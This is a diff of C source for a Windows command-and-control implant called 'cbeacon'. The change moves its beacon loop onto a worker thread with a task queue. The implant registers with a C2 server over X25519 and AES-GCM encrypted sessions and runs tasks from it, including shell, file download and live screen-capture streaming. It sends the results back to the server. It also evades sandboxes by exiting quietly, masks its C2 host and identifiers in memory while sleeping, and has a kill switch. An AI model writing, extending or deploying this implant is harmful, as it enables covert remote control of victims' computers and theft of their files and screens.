-                /* Flip auth mode: register-reject on a persisted identity
-                 * means "already registered" -> handshake; handshake-reject
-                 * means "unknown row" -> try a fresh register. */
-                g_mode_register = g_mode_register ? 0 : 1;
-                free(resp);
-                sleepmask_sleep(5000);
-                continue;
-            }
-            {
-                DWORD publen = 0;
-                BYTE *sp = b64dec(spub, &publen);
-                int agree_ok;
-                if (!sp || publen != 32) {
-                    fprintf(stderr, "[cbeacon] ECDH failed\n");
-                    if (sp) free(sp);
-                    free(resp);
-                    return 1;
-                }
-                /* Registration sessions derive from the identity key, plain
-                 * handshakes from the ephemeral one used in the frame. */
-                if (regok)
-                    agree_ok = cng_x25519_agree(sp, shared);
-                else
-                    agree_ok = cng_x25519_agree_eph(sp, shared);
-                free(sp);
-                if (agree_ok != 0) {
-                    fprintf(stderr, "[cbeacon] ECDH failed\n");
-                    free(resp);
-                    return 1;
-                }
-            }
-            if (cng_hkdf_sha256(shared, 32, (const BYTE *)"sovereign-session-v2", 20,
-                                (const BYTE *)g_uuid, (DWORD)strlen(g_uuid), sesskey) != 0) {
-                fprintf(stderr, "[cbeacon] session derive failed\n");
-                free(resp);
-                return 1;
-            }
-            cng_wipe(shared, 32);
-            memcpy(g_sesskey, sesskey, 32);
-            cng_wipe(sesskey, 32);
-            g_have_session = 1;
-            g_registered = 1;
-            if (regok) {
-                printf("[cbeacon] registered, session established\n");
-            } else {
-                printf("[cbeacon] handshake ok, session established\n");
-            }
-            free(resp);
-            continue;
-        }
-
-        /* encrypted response: {"c": ...} or resync plain envelope.
-         * NOTE: c64 is heap-allocated: a 2MB stack array overflows the
-         * default 1MB main-thread stack at function entry (0xC00000FD). */
+        item = g_task_queue[g_task_head];
+        g_task_head = (g_task_head + 1) % C_TASK_QUEUE_CAP;
+        g_task_count--;
+        LeaveCriticalSection(&g_task_mu);
+        id = item.task.id;
+        strcpy_s(type, sizeof(type), item.task.type);
         {
-            char *c64 = (char *)malloc(RESP_CAP);
-            if (!c64) { free(resp); do_sleep_interval(); continue; }
-            if (jstring(resp, "c", c64, RESP_CAP)) {
-                BYTE *blob;
-                DWORD bloblen = 0;
-                char aad[128];
-                char seqs[32];
-                BYTE *pt;
-                DWORD ptcap = RESP_CAP;
-                int ptlen;
-                _snprintf(seqs, sizeof(seqs), "%llu", frameseq);
-                _snprintf(aad, sizeof(aad), "%s%c%s", g_uuid, '\0', seqs);
-                blob = b64dec(c64, &bloblen);
-                pt = (BYTE *)malloc(ptcap);
-                if (blob && pt) {
-                    ptlen = cng_aesgcm_decrypt(g_sesskey, blob, bloblen,
-                                              (const BYTE *)aad,
-                                              (DWORD)(strlen(g_uuid) + 1 + strlen(seqs)),
-                                              pt, ptcap);
-                    if (ptlen > 0) {
-                        pt[ptlen] = '\0';
-                        /* dispatch tasks; results queued for next beacon */
-                        {
-                            const char *tp = strstr((char *)pt, "\"tasks\"");
-                            if (tp) {
-                                const char *arr = strchr(tp, '[');
-                                if (arr) {
-                                    const char *p = arr + 1;
-                                    char *newres = _strdup("");
-                                    int kill_now = 0;
-                                    while (*p && *p != ']') {
-                                        p = jskip(p);
-                                        if (*p == ',') { p++; continue; }
-                                        if (*p != '{') break;
-                                        {
-                                            ctask_t t;
-                                            const char *next = parse_task(p, &t);
-                                            char *rid = make_rid();
-                                            char *robj = NULL;
-                                            if (!rid) rid = _strdup("");
+            char *key = item.task.key ? _strdup(item.task.key) : NULL;
+            robj = execute_task(item.task, item.rid, &kill_now);
+            if (key && *key) {
+                char *sealed = seal_task_result(robj, key);
+                free(robj);
+                robj = sealed;
+                if (!robj) {
+                    robj = emit_error_result(id, type[0] ? type : "shell",
+                        "result encryption failed", item.rid);
+                }
+            }
+            free(key);
+        }
+        if (!robj) {
+            char msg[160];
+            _snprintf(msg, sizeof(msg), "task %llu produced no result", id);
+            robj = emit_error_result(id, type[0] ? type : "shell", msg, item.rid);
+        }
+        queue_result(robj);
+        free(item.rid);
+        if (kill_now) {
+            InterlockedExchange(&g_kill_requested, 1);
+            return 0;
+        }
+    }
+}
+
+static char *execute_task(ctask_t task_storage, const char *rid, int *kill_now) {
+    ctask_t t = task_storage;
+    char *robj = NULL;
                                             if (t.type[0] && decrypt_task(&t) != 0) {
                                                 robj = emit_error_result(t.id, t.type[0] ? t.type : "shell",
                                                     "task payload decryption failed", rid);
@@ -4272,7 +4474,7 @@ int main(void) {
                                                 robj = emit_text_result(t.id, "beacon_now", "beacon forced", rid);
                                             } else if (strcmp(t.type, "kill") == 0) {
                                                 robj = emit_text_result(t.id, "kill", "Agent terminating...", rid);
-                                                kill_now = 1;
+                                                *kill_now = 1;
                                             } else if (strcmp(t.type, "download") == 0) {
                                                 const char *pp = (t.path && t.path[0]) ? t.path : t.command;
                                                 if (t.transfer_id > 0 && t.direction && t.direction[0]) {
@@ -4283,7 +4485,7 @@ int main(void) {
                                                     robj = emit_error_result(t.id, "download", "path required", rid);
                                                 } else {
                                                     DWORD rlen = 0;
-                                                    long long roff = 0;
+                                                    long long roff = 0, mt = 0;
                                                     BYTE *data = do_read_chunk(pp, t.offset, t.size, &rlen, &roff);
                                                     if (data) {
                                                         char *b64 = b64enc(data, rlen);
@@ -4291,7 +4493,8 @@ int main(void) {
                                                             char mh[65] = {0};
                                                             if (chain_download_link(t.id, data, rlen, mh) != 0) mh[0] = '\0';
                                                             robj = emit_file_result(t.id, "download", b64, rid,
-                                                                base_name(pp), pp, roff, (long long)rlen, mh);
+                                                                base_name(pp), pp, roff, (long long)rlen, mh,
+                                                                cng_file_mtime(pp, &mt) == 0 ? mt : 0);
                                                             free(b64);
                                                         }
                                                         cng_wipe(data, rlen);
@@ -4761,68 +4964,324 @@ int main(void) {
                                                 _snprintf(msg, sizeof(msg), "unsupported in C implant: %s", t.type);
                                                 robj = emit_error_result(t.id, t.type, msg, rid);
                                             }
-                                            if (robj) {
-                                                size_t need = strlen(newres) + strlen(robj) + 2;
-                                                if (need > RESULTS_CAP) { free(robj); robj = NULL; }
-                                                else { char *nr = (char *)realloc(newres, need);
-                                                if (nr) {
-                                                    newres = nr;
-                                                    if (newres[0]) strcat_s(newres, need, ",");
-                                                    strcat_s(newres, need, robj);
+    free_task(&t);
+    return robj;
+}
+
+static void final_delivery_and_exit(void) {
+    char *results = pending_results_snapshot();
+    char *inner = build_data_inner(results);
+    if (inner) {
+        unsigned long long fs = 0;
+        char *fr = build_encrypted(inner, &fs);
+        if (fr) {
+            DWORD rl = 0;
+            char *rp = http_post(fr, (DWORD)strlen(fr), &rl);
+            if (rp) free(rp);
+            free(fr);
+        }
+        free(inner);
+    }
+    free(results);
+    ExitProcess(0);
+}
+
+int main(void) {
+    fprintf(stderr, "[cbeacon] enter\n");
+    BYTE shared[32], sesskey[32];
+    DWORD seclen = 0;
+    BYTE *secret = NULL;
+    char *results = _strdup("");
+    setvbuf(stdout, NULL, _IONBF, 0);
+    if (SECRET_ID[0] == '\0' || SECRET_B64[0] == '\0') {
+        fprintf(stderr, "[cbeacon] build with -DSECRET_ID=... -DSECRET_B64=...\n");
+        return 1;
+    }
+    /* Startup sandbox gate (P1-6A): tick-acceleration + hw checks. Quiet
+     * exit on detection; build with -DSANDBOX_CHECKS=0 to strip for labs. */
+    if (evade_sandbox_check() != 0) {
+        return 0;
+    }
+    secret = b64dec(SECRET_B64, &seclen);
+    if (!secret || seclen != 32) {
+        fprintf(stderr, "[cbeacon] bad SECRET_B64\n");
+        return 1;
+    }
+    fprintf(stderr, "[cbeacon] secret ok\n");
+    memcpy(g_regkey, secret, 32);
+    cng_wipe(secret, seclen);
+    free(secret);
+    {
+        BYTE idpriv[32], idpub[32];
+        fprintf(stderr, "[cbeacon] loading identity...\n");
+        if (ident_load(idpriv) == 0 && cng_x25519_use_priv(idpriv, idpub) == 0) {
+            printf("[cbeacon] identity restored\n");
+            g_mode_register = 0;
+            seq_load(); /* recover via handshake, not re-register */
+        } else {
+            fprintf(stderr, "[cbeacon] fresh identity...\n");
+            gen_uuid();
+            g_seq = 0;
+            seq_save();
+            if (cng_random(idpriv, 32) != 0) return 1;
+            fprintf(stderr, "[cbeacon] random ok, selftest+derive...\n");
+            if (cng_x25519_use_priv(idpriv, idpub) != 0) return 1;
+            fprintf(stderr, "[cbeacon] key ok, saving...\n");
+            if (ident_save(idpriv) != 0)
+                fprintf(stderr, "[cbeacon] warning: identity not persisted\n");
+        }
+        memcpy(g_idpub_for_reg, idpub, 32);
+        memcpy(g_idpriv, idpriv, 32);
+        cng_wipe(idpriv, 32);
+    }
+    /* Arm the sleep mask now that the UUID is final (shadow covers C2
+     * host/path, secret id, UA and UUID). Best-effort: beaconing works
+     * unmasked if init fails. */
+    if (!sleepmask_init(g_uuid)) {
+        fprintf(stderr, "[cbeacon] warning: sleep mask unavailable\n");
+    }
+    printf("[cbeacon] uuid=%s c2=%s:%d%s\n", g_uuid, C2_HOST, C2_PORT, BEACON_PATH);
+    {
+        char *restored = spool_load();
+        if (restored) {
+            free(results);
+            results = restored;
+            printf("[cbeacon] restored %lu bytes of pending results\n", (unsigned long)strlen(results));
+        }
+    }
+    InitializeCriticalSection(&g_task_mu);
+    InitializeCriticalSection(&g_results_mu);
+    g_pending_results = results;
+    results = NULL;
+    if (CreateThread(NULL, 0, task_worker, NULL, 0, NULL) == NULL) {
+        fprintf(stderr, "[cbeacon] failed to start task worker\n");
+        return 1;
+    }
+
+    for (;;) {
+        if (g_kill_requested) final_delivery_and_exit();
+        char *frame = NULL, *resp = NULL, *results = NULL;
+        DWORD resplen = 0;
+        unsigned long long frameseq = 0;
+        int sent_results = g_registered;
+        if (!g_registered) {
+            frame = g_mode_register ? build_register() : build_handshake();
+            dbglog(g_mode_register ? "built-reg" : "built-hs", "", 0);
+        } else {
+            char *inner;
+            results = pending_results_snapshot();
+            inner = build_data_inner(results);
+            if (!inner) {
+                free(results);
+                sleepmask_sleep(5000);
+                continue;
+            }
+            dbglog("results", results, (int)strlen(results));
+            dbglog("inner", inner, (int)strlen(inner));
+            frame = build_encrypted(inner, &frameseq);
+            free(inner);
+        }
+        if (!frame) { free(results); sleepmask_sleep(5000); continue; }
+        resp = http_post(frame, (DWORD)strlen(frame), &resplen);
+        free(frame);
+        dbglog("post-ret", "", 0);
+        if (!resp) { free(results); do_sleep_interval(); continue; }
+        if (g_last_http_status != 0 && g_last_http_status != 200) {
+            if (g_last_http_status == 426) {
+                static int reported = 0;
+                if (!reported) {
+                    char reason[256];
+                    reason[0] = '\0';
+                    if (jstring(resp, "error", reason, sizeof(reason)) && reason[0]) {
+                        fprintf(stderr, "[cbeacon] beacon refused: %s\n", reason);
+                    } else {
+                        fprintf(stderr, "[cbeacon] beacon refused: the server does not serve this implant's protocol version\n");
+                    }
+                    reported = 1;
+                }
+            }
+            free(resp);
+            free(results);
+            do_sleep_interval();
+            continue;
+        }
+        /* Remove only the snapshot that was actually sent. Results produced
+         * by the worker while the request was in flight remain queued. */
+        if (sent_results) {
+            pending_results_commit_sent(results);
+            g_ack_count = 0;
+        }
+        free(results);
+        dbglog(g_registered ? "resp-enc" : "resp-reg", resp, (int)resplen);
+
+
+        if (!g_registered) {
+            /* auth response: {seq,reg_ok,ecdh_pub,mac,reregister?} */
+            char spub[512] = {0}, mac[512] = {0};
+            unsigned long long seq = ju64(resp, "seq");
+            int regok = jbool(resp, "reg_ok");
+            int rereg = jbool(resp, "reregister");
+            if (verify_killswitch_json(resp)) {
+                fprintf(stderr, "[cbeacon] kill-switch armed, exiting\n");
+                free(resp);
+                return 0;
+            }
+            if (rereg) {
+                /* Server lost our row but holds our secret: re-enroll. */
+                g_mode_register = 1;
+                free(resp);
+                sleepmask_sleep(2000);
+                continue;
+            }
+            if (!jstring(resp, "ecdh_pub", spub, sizeof(spub)) ||
+                !jstring(resp, "mac", mac, sizeof(mac)) ||
+                !verify_resp_mac(seq, spub, mac)) {
+                fprintf(stderr, "[cbeacon] auth response rejected\n");
+                /* Flip auth mode: register-reject on a persisted identity
+                 * means "already registered" -> handshake; handshake-reject
+                 * means "unknown row" -> try a fresh register. */
+                g_mode_register = g_mode_register ? 0 : 1;
+                free(resp);
+                sleepmask_sleep(5000);
+                continue;
+            }
+            {
+                DWORD publen = 0;
+                BYTE *sp = b64dec(spub, &publen);
+                int agree_ok;
+                if (!sp || publen != 32) {
+                    fprintf(stderr, "[cbeacon] ECDH failed\n");
+                    if (sp) free(sp);
+                    free(resp);
+                    return 1;
+                }
+                /* Registration sessions derive from the identity key, plain
+                 * handshakes from the ephemeral one used in the frame. */
+                if (regok)
+                    agree_ok = cng_x25519_agree(sp, shared);
+                else
+                    agree_ok = cng_x25519_agree_eph(sp, shared);
+                free(sp);
+                if (agree_ok != 0) {
+                    fprintf(stderr, "[cbeacon] ECDH failed\n");
+                    free(resp);
+                    return 1;
+                }
+            }
+            if (cng_hkdf_sha256(shared, 32, (const BYTE *)"sovereign-session-v2", 20,
+                                (const BYTE *)g_uuid, (DWORD)strlen(g_uuid), sesskey) != 0) {
+                fprintf(stderr, "[cbeacon] session derive failed\n");
+                free(resp);
+                return 1;
+            }
+            cng_wipe(shared, 32);
+            memcpy(g_sesskey, sesskey, 32);
+            cng_wipe(sesskey, 32);
+            g_have_session = 1;
+            g_registered = 1;
+            if (regok) {
+                printf("[cbeacon] registered, session established\n");
+            } else {
+                printf("[cbeacon] handshake ok, session established\n");
+            }
+            free(resp);
+            continue;
+        }
+
+        /* encrypted response: {"c": ...} or resync plain envelope.
+         * NOTE: c64 is heap-allocated: a 2MB stack array overflows the
+         * default 1MB main-thread stack at function entry (0xC00000FD). */
+        {
+            char *c64 = (char *)malloc(RESP_CAP);
+            if (!c64) { free(resp); do_sleep_interval(); continue; }
+            if (jstring(resp, "c", c64, RESP_CAP)) {
+                BYTE *blob;
+                DWORD bloblen = 0;
+                char aad[128];
+                char seqs[32];
+                BYTE *pt;
+                DWORD ptcap = RESP_CAP;
+                int ptlen;
+                _snprintf(seqs, sizeof(seqs), "%llu", frameseq);
+                _snprintf(aad, sizeof(aad), "%s%c%s", g_uuid, '\0', seqs);
+                blob = b64dec(c64, &bloblen);
+                pt = (BYTE *)malloc(ptcap);
+                if (blob && pt) {
+                    ptlen = cng_aesgcm_decrypt(g_sesskey, blob, bloblen,
+                                              (const BYTE *)aad,
+                                              (DWORD)(strlen(g_uuid) + 1 + strlen(seqs)),
+                                              pt, ptcap);
+                    if (ptlen > 0) {
+                        pt[ptlen] = '\0';
+                        if (verify_killswitch_json((char *)pt)) {
+                            free(resp);
+                            free(pt);
+                            if (blob) free(blob);
+                            free(c64);
+                            return 0;
+                        }
+                        /* dispatch tasks; results queued for next beacon */
+                        {
+                            const char *tp = strstr((char *)pt, "\"tasks\"");
+                            if (tp) {
+                                const char *arr = strchr(tp, '[');
+                                if (arr) {
+                                    const char *p = arr + 1;
+                                    while (*p && *p != ']') {
+                                        p = jskip(p);
+                                        if (*p == ',') { p++; continue; }
+                                        if (*p != '{') break;
+                                        {
+                                            ctask_t t;
+                                            const char *next = parse_task(p, &t);
+                                            char *rid = make_rid();
+                                            if (!next) {
+                                                free(rid);
+                                                free_task(&t);
+                                                break;
+                                            }
+                                            if (t.id) {
+                                                if (task_seen(t.id)) {
+                                                    ack_add(t.id);
+                                                    free(rid);
+                                                    free_task(&t);
+                                                    p = next;
+                                                    continue;
                                                 }
-                                                free(robj);
-                                                }
+                                                task_mark_seen(t.id);
+                                                ack_add(t.id);
+                                            }
+                                            if (!rid) rid = _strdup("");
+                                            if (!task_queue_enqueue(&t, rid)) {
+                                                queue_result(emit_error_result(t.id,
+                                                    t.type[0] ? t.type : "shell",
+                                                    "task not accepted: execution queue full", rid));
                                             }
                                             free(rid);
                                             free_task(&t);
-                                            if (kill_now) {
-                                                p = next ? next : p + 1;
-                                                break;
-                                            }
-                                            p = next ? next : p + 1;
+                                            p = next;
                                         }
                                     }
-                                    /* Live stream: one JPEG frame per beacon while
-                                     * streaming; identical frames are skipped. */
-                                    if (g_streaming && newres) {
+                                    if (g_streaming) {
                                         BYTE *jpg = NULL;
                                         DWORD jlen = 0;
                                         if (capture_jpeg(g_stream_q, NULL, &jpg, &jlen) == 0 && jpg && jlen > 0) {
                                             unsigned long h = frame_hash(jpg, jlen);
                                             if (h != g_stream_hash) {
                                                 g_stream_hash = h;
-                                                results_append(&newres, emit_frame_result(jpg, jlen));
+                                                queue_result(emit_frame_result(jpg, jlen));
                                             }
                                             free(jpg);
                                         } else {
                                             if (jpg) free(jpg);
                                             g_streaming = 0;
                                             g_stream_hash = 0;
-                                            results_append(&newres, emit_stream_error("screen stream stopped: capture failed"));
+                                            queue_result(emit_stream_error("screen stream stopped: capture failed"));
                                         }
                                     }
-                                    free(results);
-                                    results = newres;
-                                    if (kill_now) {
-                                        /* Best-effort final delivery like Go handleKill, then exit. */
-                                        char *info = build_info_json();
-                                        if (info) {
-                                            size_t icap = strlen(results) + INFO_CAP + 512;
-                                            char *inner = (char *)malloc(icap);
-                                            if (inner) {
-                                                unsigned long long fs = 0;
-                                                char *fr = NULL;
-                                                DWORD rl = 0;
-                                                _snprintf(inner, icap, "{\"uuid\":\"%s\",\"pv\":2,\"info\":{%s},\"results\":[%s]}", g_uuid, info, results);
-                                                fr = build_encrypted(inner, &fs);
-                                                if (fr) { char *rp = http_post(fr, (DWORD)strlen(fr), &rl); if (rp) free(rp); free(fr); }
-                                                free(inner);
-                                            }
-                                            free(info);
-                                        }
+                                    if (g_kill_requested) {
                                         free(resp);
-                                        free(results);
-                                        ExitProcess(0);
+                                        final_delivery_and_exit();
                                     }
                                 }
                             }
@@ -4852,7 +5311,7 @@ int main(void) {
             }
             free(c64);
         }
-        if (strstr(resp, "kill_switch")) {
+        if (verify_killswitch_json(resp)) {
             fprintf(stderr, "[cbeacon] kill-switch armed, exiting\n");
             free(resp);
             return 0;
